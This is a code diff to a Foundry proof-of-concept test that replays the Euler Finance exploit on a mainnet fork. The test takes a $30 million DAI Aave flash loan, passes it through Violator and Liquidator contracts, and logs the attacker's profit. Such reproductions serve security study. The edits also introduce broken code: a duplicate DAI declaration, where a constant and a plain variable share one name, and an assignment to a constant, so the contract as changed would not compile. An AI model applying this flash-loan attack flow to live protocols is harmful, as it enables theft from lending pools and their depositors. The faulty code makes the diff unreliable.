@@ -15,7 +15,8 @@ import { IMarkets } from "./interface/IMarkets.sol";
 import { IRiskManager } from "euler-contracts/contracts/IRiskManager.sol";
 
 contract EulerFinancePoC is Test {
-    IERC20 constant UNDERLYING = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
+    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
+    IERC20 DAI;
     IEToken constant eToken = IEToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
     // address eTokenImpl = address(0xeC29b4C2CaCaE5dF1A491f084E5Ec7C62A7EdAb5);
     IMarkets constant MARKETS = IMarkets(0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3);
@@ -32,35 +33,46 @@ contract EulerFinancePoC is Test {
     function setUp() public {
         vm.createSelectFork("eth", 16817995);
         vm.etch(address(MARKETS_IMPL), address(deployCode('MarketsView.sol')).code);
-        vm.label(address(UNDERLYING), "UNDERLYING");
+        vm.label(address(DAI), "DAI");
         vm.label(address(eToken), "eToken");
         vm.label(address(dToken), "dToken");
         vm.label(address(aaveV2), "Aave");
     }
 
     function testExploit() public {
-        console.log("Attacker balance before exploit", UNDERLYING.balanceOf(address(this))/1e18, IERC20(UNDERLYING).symbol());
+
+        DAI = DAI;
+        console.log("Attacker balance before exploit", DAI.balanceOf(address(this))/1e18, IERC20(DAI).symbol());
         console.log(" ");
         // 1. Flash loan $30 million DAI
         uint256 aaveFlashLoanAmount = 30_000_000 * 1e18;
+        // setup the flashLoan arguments
+        // array of the asset(s) to flashloan
         address[] memory assets = new address[](1);
-        assets[0] = address(UNDERLYING);
+        assets[0] = address(DAI);
+        // array cointaining the amount(s) of token(s) to flashLoan
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = aaveFlashLoanAmount;
+        // modes: the types of debt position to open if the flashloan is not returned.
+        // 0: no open debt. (amount + fee must be paid or revert)
+        // 1: stable mode debt
+        // 2: variable mode debt
         uint256[] memory modes = new uint[](1);
         modes[0] = 0;
+        // params (unused) Arbitrary bytes-encoded params that will be passed to executeOperation() method of the receiver contract.
         bytes memory params =
-        abi.encode(30_000_000, 200_000_000, 100_000_000, 44_000_000, address(UNDERLYING), address(eToken), address(dToken));
+        abi.encode();
         // documentation on Aave flash loans: https://docs.aave.com/developers/guides/flash-loans
-        aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), params, 0);
+        aaveV2.flashLoan({receiverAddress: address(this), assets: assets, amounts: amounts, modes: modes, onBehalfOf: address(this), params: params, referralCode: 0});
 
         // 10. attacker's balance > 30 million DAI borrowed + 27k DAI interest => loan repaid successfully automatically (else flashLoan would revert)
 
         // 8.87 million DAI profit!
-        console.log("Attacker balance after exploit", UNDERLYING.balanceOf(address(this)) / 1e18, IERC20(UNDERLYING).symbol());
+        console.log("Attacker balance after exploit", DAI.balanceOf(address(this)) / 1e18, IERC20(DAI).symbol());
         console.log(" ");
     }
 
+    // executeOperations is the callback function called by flashLoan. Conforms to the following interface: https://github.com/aave/aave-v3-core/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol
     function executeOperation(
         address[] calldata assets,
         uint256[] calldata amounts,
@@ -69,12 +81,12 @@ contract EulerFinancePoC is Test {
         bytes calldata params
     ) external returns (bool) {
         // approve aave to spend DAI
-        UNDERLYING.approve(address(aaveV2), type(uint256).max);
+        DAI.approve(address(aaveV2), type(uint256).max);
         // 2. deploy two contracts
-        violator = new Violator(UNDERLYING, IEToken(address(eToken)), dToken, EULER, LIQUIDATION, MARKETS, person);
-        liquidator = new Liquidator(UNDERLYING, IEToken(address(eToken)), dToken, EULER, LIQUIDATION, MARKETS);
+        violator = new Violator(DAI, IEToken(address(eToken)), dToken, EULER, LIQUIDATION, MARKETS, person);
+        liquidator = new Liquidator(DAI, IEToken(address(eToken)), dToken, EULER, LIQUIDATION, MARKETS);
         // transfer flash loan to the violator
-        UNDERLYING.transfer(address(violator), UNDERLYING.balanceOf(address(this)));
+        DAI.transfer(address(violator), DAI.balanceOf(address(this)));
         violator.violate();
         liquidator.liquidate(address(violator));
         return true;
